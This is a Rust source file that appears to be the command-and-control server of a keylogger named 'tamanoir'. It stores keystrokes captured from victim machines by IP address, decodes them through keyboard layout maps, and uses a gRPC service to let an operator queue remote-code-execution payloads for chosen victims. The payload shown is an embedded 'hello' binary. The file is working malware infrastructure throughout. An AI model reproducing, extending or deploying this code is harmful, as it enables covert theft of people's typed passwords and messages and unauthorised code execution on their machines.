pub mod cli;
pub mod dns_proxy;
pub mod rce;
pub mod tamanoir_grpc {
    tonic::include_proto!("tamanoir");
}

use core::fmt;
use std::{
    collections::HashMap,
    fmt::Display,
    io::{self, Write},
    net::{Ipv4Addr, SocketAddr},
    process::Command,
    str::FromStr,
    sync::Arc,
};

use log::{debug, info};
use serde::Deserialize;
use tokio::sync::Mutex;
use tonic::{transport::Server, Request, Response, Status};

use crate::tamanoir_grpc::{
    proxy_server::{Proxy, ProxyServer},
    GetSessionsResponse, NoArgs, SessionResponse, SetSessionRceRequest,
};

const COMMON_REPEATED_KEYS: [&str; 4] = [" 󱊷 ", " 󰌑 ", " 󰁮 ", "  "];
const AR_COUNT_OFFSET: usize = 10;
const AR_HEADER_LEN: usize = 12;
const FOOTER_TXT: &str = "r10n4m4t/";
const FOOTER_EXTRA_BYTES: usize = 3;
const FOOTER_LEN: usize = FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;
const HELLO_X86_64: &[u8] = include_bytes!("../../assets/examples/bins/hello_x86_64.bin");

#[derive(Debug, Clone, PartialEq)]
pub enum TargetArch {
    X86_64,
    Aarch64,
}
#[derive(Debug, Clone, PartialEq)]
pub enum Engine {
    Docker,
    Podman,
}
impl fmt::Display for TargetArch {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            TargetArch::X86_64 => write!(f, "x86_64"),
            TargetArch::Aarch64 => write!(f, "aarch64"),
        }
    }
}
impl fmt::Display for Engine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Engine::Docker => write!(f, "docker"),
            Engine::Podman => write!(f, "podman"),
        }
    }
}
impl FromStr for Engine {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "docker" => Ok(Engine::Docker),
            "podman" => Ok(Engine::Podman),
            _ => Err(format!("{} engine isn't implmented", s)),
        }
    }
}

impl FromStr for TargetArch {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "x86_64" => Ok(TargetArch::X86_64),
            "aarch64" => Ok(TargetArch::Aarch64),
            _ => Err(format!("{} arch isn't implmented", s)),
        }
    }
}
enum Layout {
    Qwerty = 0,
    Azerty = 1,
    Unknown = 2,
}
impl From<u8> for Layout {
    fn from(value: u8) -> Self {
        match value {
            0 => Self::Qwerty,
            1 => Self::Azerty,
            _ => Self::Unknown,
        }
    }
}
impl TargetArch {
    pub const ALL: [Self; 2] = [Self::X86_64, Self::Aarch64];
}

#[derive(Deserialize, Debug)]
pub struct KeyMap {
    keys: HashMap<u8, String>,
    modifier: HashMap<u8, HashMap<u8, String>>,
}
impl KeyMap {
    pub fn get(&self, key_code: &u8, last_keycode: Option<&u8>) -> Vec<String> {
        let mut out = vec![];
        match last_keycode {
            None => {
                if let Some(key) = self.keys.get(key_code) {
                    out.push(key.to_string());
                }
            }
            Some(last_keycode) => match self.modifier.get(last_keycode) {
                Some(modifier_map) => {
                    if let Some(key) = modifier_map.get(key_code) {
                        out.push(key.to_string());
                    } else {
                        out.extend(self.get(last_keycode, None));
                        out.extend(self.get(key_code, None));
                    }
                }
                _ => {
                    out.extend(self.get(key_code, None));
                }
            },
        }
        out
    }
    pub fn is_modifier(&self, key_code: Option<&u8>) -> bool {
        if let Some(key_code) = key_code {
            return self.modifier.contains_key(key_code);
        }
        false
    }
}

#[derive(Debug, Deserialize, Clone)]
pub struct Session {
    pub ip: Ipv4Addr,

    pub keys: Vec<String>,
    pub key_codes: Vec<u8>,
    pub rce_payload: Option<Vec<u8>>,
    pub rce_payload_buffer: Option<Vec<u8>>,
}
impl Session {
    pub fn new(sock_addr: SocketAddr) -> Option<Self> {
        match sock_addr {
            SocketAddr::V4(addr) => Some(Session {
                ip: *addr.ip(),
                keys: vec![],
                key_codes: vec![],
                rce_payload: None,
                rce_payload_buffer: None,
            }),
            _ => None,
        }
    }
    pub fn set_rce_payload(&mut self, rce: &str, target_arch: TargetArch) -> Result<(), String> {
        if let Some(_) = self.rce_payload {
            return Err(format!(
                "An out payload already exists for session {}",
                self.ip
            ));
        }
        match target_arch {
            TargetArch::X86_64 => match &*rce {
                "hello" => {
                    self.rce_payload = Some(HELLO_X86_64.to_vec());
                    Ok(())
                }
                _ => Err(format!(
                    "{} payload unavailable for arch {:#?}",
                    rce, target_arch
                )),
            },
            _ => Err(format!("target arch {:#?} unavailable", target_arch)),
        }
    }
}

impl Display for Session {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut fmt_keys: Vec<String> = vec![];
        let mut repeat_counter = 1;
        let mut last_key: Option<String> = None;
        for current_key in self.keys.clone().into_iter() {
            if let Some(ref prev_key) = last_key {
                if current_key == *prev_key && COMMON_REPEATED_KEYS.contains(&current_key.as_str())
                {
                    repeat_counter += 1;
                } else {
                    if repeat_counter > 1 {
                        fmt_keys.push(format!("(x{}) ", repeat_counter));
                    }
                    fmt_keys.push(current_key.clone());
                    last_key = Some(current_key);
                    repeat_counter = 1;
                }
            } else {
                fmt_keys.push(current_key.clone());
                last_key = Some(current_key);
            }
        }
        if repeat_counter > 1 {
            fmt_keys.push(format!("(x{}) ", repeat_counter))
        }
        write!(f, "({}): {}", self.ip, fmt_keys.join(""))
    }
}

pub struct Cmd {
    pub shell: String,
    pub stdout: bool,
}

impl Cmd {
    pub fn exec(&self, cmd: String) -> Result<(), String> {
        let mut program = Command::new(&self.shell);
        let prog: &mut Command = program.arg("-c").arg(&cmd);

        let output = prog
            .output()
            .map_err(|_| format!("Failed to run {}", cmd))?;
        if self.stdout {
            io::stdout().write_all(&output.stdout).unwrap();
            io::stderr().write_all(&output.stderr).unwrap();
        }
        if !output.status.success() {
            return Err(format!(
                "{} failed with status {}: {}",
                cmd,
                output.status,
                String::from_utf8_lossy(&output.stderr)
            ));
        }
        Ok(())
    }
}
#[derive(Debug, Deserialize)]
struct CargoMetadata {
    package: Option<PackageMetadata>,
}

#[derive(Debug, Deserialize)]
struct PackageMetadata {
    name: String,
}
pub async fn serve_tonic(sessions: SessionsStore) -> anyhow::Result<()> {
    let addr = "[::1]:50051".parse().unwrap();

    info!("Starting grpc server");
    debug!("Grpc server is listning on  [::1]:50051");
    Server::builder()
        .add_service(ProxyServer::new(sessions))
        .serve(addr)
        .await?;
    Ok(())
}

type SessionsState = Arc<Mutex<HashMap<Ipv4Addr, Session>>>;
#[derive(Clone)]
pub struct SessionsStore {
    pub sessions: SessionsState,
}
impl SessionsStore {
    pub fn new() -> Self {
        Self {
            sessions: Arc::new(Mutex::new(HashMap::new())),
        }
    }
}

#[tonic::async_trait]
impl Proxy for SessionsStore {
    async fn get_sessions(
        &self,
        request: Request<NoArgs>,
    ) -> Result<Response<GetSessionsResponse>, Status> {
        debug!(
            "<GetSessions> Got a request from {:?}",
            request.remote_addr()
        );
        let current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
            self.sessions.lock().await;

        let mut sessions: Vec<SessionResponse> = vec![];
        for s in current_sessions.values().into_iter() {
            sessions.push(SessionResponse {
                ip: s.ip.to_string(),
                key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
            })
        }

        let reply = GetSessionsResponse { sessions };
        Ok(Response::new(reply))
    }
    async fn set_session_rce(
        &self,
        request: Request<SetSessionRceRequest>,
    ) -> Result<Response<NoArgs>, Status> {
        debug!(
            "<SetSessionRce> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        let ip = Ipv4Addr::from_str(&req.ip)
            .map_err(|_| Status::new(402.into(), format!("{}: invalid ip", req.ip)))?;

        let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
            self.sessions.lock().await;
        let target_arch = TargetArch::from_str(&req.target_arch).map_err(|_| {
            Status::new(
                402.into(),
                format!("{}: unknown target arch", req.target_arch),
            )
        })?;
        match current_sessions.get_mut(&ip) {
            Some(existing_session) => {
                match existing_session.set_rce_payload(&req.rce, target_arch) {
                    Ok(_) => Ok(Response::new(NoArgs {})),
                    Err(_) => Err(Status::new(404.into(), format!("{}: invalid rce", req.rce))),
                }
            }
            None => Err(Status::new(
                404.into(),
                format!("{}: session not found", ip),
            )),
        }
    }
}
